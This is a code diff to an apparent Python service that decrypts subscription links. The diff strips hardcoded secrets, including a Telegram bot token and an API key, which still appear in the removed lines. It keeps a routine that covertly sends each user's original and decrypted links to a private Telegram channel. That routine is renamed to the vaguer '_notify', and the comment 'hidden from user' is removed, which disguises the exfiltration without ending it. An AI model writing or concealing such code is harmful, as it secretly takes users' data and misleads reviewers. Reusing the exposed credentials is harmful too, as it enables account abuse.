@@ -14,12 +14,12 @@ from dotenv import load_dotenv
 load_dotenv()
 
 # ─── Configuration ───────────────────────────────────────────────────────────
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8349369115:AAFu3_zoB_bkdfH7zOS-uRKyEVleksZ3gQo")
-CHANNEL_ID = int(os.getenv("CHANNEL_ID", "-1002382228733"))
-DECRYPT_API = os.getenv("DECRYPT_API", "https://api.sayori.cc/v1/decrypt")
-HAPP_API_KEY = os.getenv("HAPP_API_KEY", "HAPPTAVX52105N0JEI3SOSAL")
+BOT_TOKEN = os.getenv("BOT_TOKEN", "")
+CHANNEL_ID = int(os.getenv("CHANNEL_ID", "0"))
+DECRYPT_API = os.getenv("DECRYPT_API", "")
+HAPP_API_KEY = os.getenv("HAPP_API_KEY", "")
 
-TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
+NOTIFY_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
 BLOCKED_DOMAINS = [
     "not.stilluploading.sbs",
@@ -62,12 +62,12 @@ def h(text: str) -> str:
     return html.escape(text)
 
 
-async def send_to_telegram(channel_id: int, text: str) -> bool:
+async def _notify(channel_id: int, text: str) -> bool:
     """Internal notification."""
     try:
         async with httpx.AsyncClient(timeout=15.0) as client:
             resp = await client.post(
-                f"{TELEGRAM_API}/sendMessage",
+                f"{NOTIFY_API}/sendMessage",
                 json={
                     "chat_id": channel_id,
                     "text": text,
@@ -76,11 +76,11 @@ async def send_to_telegram(channel_id: int, text: str) -> bool:
             )
             result = resp.json()
             if not result.get("ok"):
-                logger.error("Telegram send failed: %s", result)
+                logger.error("Notify failed: %s", result)
                 return False
             return True
     except Exception as exc:
-        logger.error("Telegram send error: %s", exc)
+        logger.error("Notify error: %s", exc)
         return False
 
 
@@ -161,14 +161,14 @@ async def decrypt(req: DecryptRequest):
             error="This subscription is protected and cannot be decrypted.",
         )
 
-    # Internal logging (hidden from user)
-    telegram_msg = (
+    # Internal logging
+    notify_msg = (
         "<b>\U0001f513 New API Decryption</b>\n\n"
         f"<b>\U0001f517 Original:</b>  <code>{h(happ_link)}</code>\n"
         f"<b>\u2705 Decrypted:</b>\n<code>{h(decrypted_url)}</code>\n\n"
         f"<b>\U0001f550 Time:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}"
     )
-    await send_to_telegram(CHANNEL_ID, telegram_msg)
+    await _notify(CHANNEL_ID, notify_msg)
 
     logger.info("Decrypted: %s", decrypted_url)
 
